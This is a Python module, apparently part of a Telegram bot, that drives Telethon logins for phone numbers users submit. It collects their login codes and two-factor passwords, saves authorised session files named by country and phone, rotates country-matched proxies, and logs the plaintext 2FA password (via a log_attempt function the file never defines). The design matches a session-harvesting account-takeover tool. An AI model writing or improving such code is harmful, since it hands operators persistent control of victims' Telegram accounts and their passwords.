from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, FloodWaitError
import config
import os
import random
import asyncio
from datetime import datetime
import sqlite3

class AuthManager:
    def __init__(self):
        self.sessions = {}
        self.proxies = self.load_proxies()
        self.proxy_index = 0
    
    def load_proxies(self):
        proxies = []
        try:
            with open('proxies.txt', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        parts = line.split(':')
                        if len(parts) == 4:
                            proxy = {
                                'proxy_type': 'socks5',
                                'addr': parts[0],
                                'port': int(parts[1]),
                                'username': parts[2],
                                'password': parts[3],
                                'country': None
                            }
                        elif len(parts) == 5:  # с тегом страны
                            proxy = {
                                'proxy_type': 'socks5',
                                'addr': parts[0],
                                'port': int(parts[1]),
                                'username': parts[2],
                                'password': parts[3],
                                'country': parts[4].lower()
                            }
                        else:
                            proxy = {
                                'proxy_type': 'socks5',
                                'addr': parts[0],
                                'port': int(parts[1]),
                                'username': None,
                                'password': None,
                                'country': None
                            }
                        proxies.append(proxy)
        except Exception as e:
            print(f"Error loading proxies: {e}")
        return proxies
    
    def get_next_proxy(self, country=None):
        if not self.proxies:
            return None
        
        # Приоритет прокси по стране
        if country:
            country_code = {
                'Россия': 'ru',
                'Украина': 'ua',
                'Казахстан': 'kz',
                'Беларусь': 'by',
                'Узбекистан': 'uz'
            }.get(country, '').lower()
            
            country_proxies = [p for p in self.proxies if p.get('country') == country_code]
            if country_proxies:
                return random.choice(country_proxies)
        
        # Циклический выбор
        proxy = self.proxies[self.proxy_index % len(self.proxies)]
        self.proxy_index += 1
        return proxy
    
    async def start_auth(self, user_id, phone, country):
        try:
            # Очищаем номер
            phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
            
            # Определяем код страны для имени файла
            country_code = {
                'Россия': 'RU',
                'Украина': 'UA',
                'Казахстан': 'KZ',
                'Беларусь': 'BY',
                'Узбекистан': 'UZ',
                'Другое': 'OT'
            }.get(country, 'OT')
            
            session_name = f"sessions/{country_code}_{phone.replace('+', '')}"
            
            # Выбираем прокси
            proxy = self.get_next_proxy(country)
            proxy_dict = None
            if proxy:
                proxy_dict = (
                    proxy['proxy_type'],
                    proxy['addr'],
                    proxy['port'],
                    proxy['username'],
                    proxy['password']
                ) if proxy['username'] else (
                    proxy['proxy_type'],
                    proxy['addr'],
                    proxy['port']
                )
            
            # Создаем клиента
            client = TelegramClient(session_name, config.API_ID, config.API_HASH, proxy=proxy_dict)
            await client.connect()
            
            if not await client.is_user_authorized():
                # Отправляем код
                await client.send_code_request(phone)
                
                self.sessions[user_id] = {
                    'client': client,
                    'phone': phone,
                    'country': country,
                    'session_name': session_name
                }
                
                return {'status': 'code_sent'}
            else:
                await client.disconnect()
                return {'status': 'error', 'message': 'Аккаунт уже авторизован'}
                
        except FloodWaitError as e:
            return {'status': 'error', 'message': f'Подожди {e.seconds} секунд'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    async def submit_code(self, user_id, code):
        if user_id not in self.sessions:
            return {'status': 'error', 'message': 'Сессия не найдена'}
        
        session = self.sessions[user_id]
        client = session['client']
        
        try:
            await client.sign_in(session['phone'], code)
            
            # Успешный вход
            log_data = {
                'status': 'success',
                'phone': session['phone'],
                'country': session['country']
            }
            
            # Сохраняем в БД
            conn = sqlite3.connect('database.db')
            c = conn.cursor()
            c.execute("UPDATE users SET step = ? WHERE user_id = ?", ('completed', user_id))
            conn.commit()
            conn.close()
            
            return log_data
            
        except SessionPasswordNeededError:
            # Требуется 2FA
            conn = sqlite3.connect('database.db')
            c = conn.cursor()
            c.execute("UPDATE users SET step = ? WHERE user_id = ?", ('waiting_password', user_id))
            conn.commit()
            conn.close()
            
            return {'status': 'password_needed'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    async def submit_password(self, user_id, password):
        if user_id not in self.sessions:
            return {'status': 'error', 'message': 'Сессия не найдена'}
        
        session = self.sessions[user_id]
        client = session['client']
        
        try:
            await client.sign_in(password=password)
            
            # Логируем пароль
            log_attempt(user_id, session['phone'], session['country'], password=password)
            
            return {
                'status': 'success',
                'phone': session['phone'],
                'country': session['country']
            }
        except Exception as e:
            return {'status': 'error', 'message': str(e)}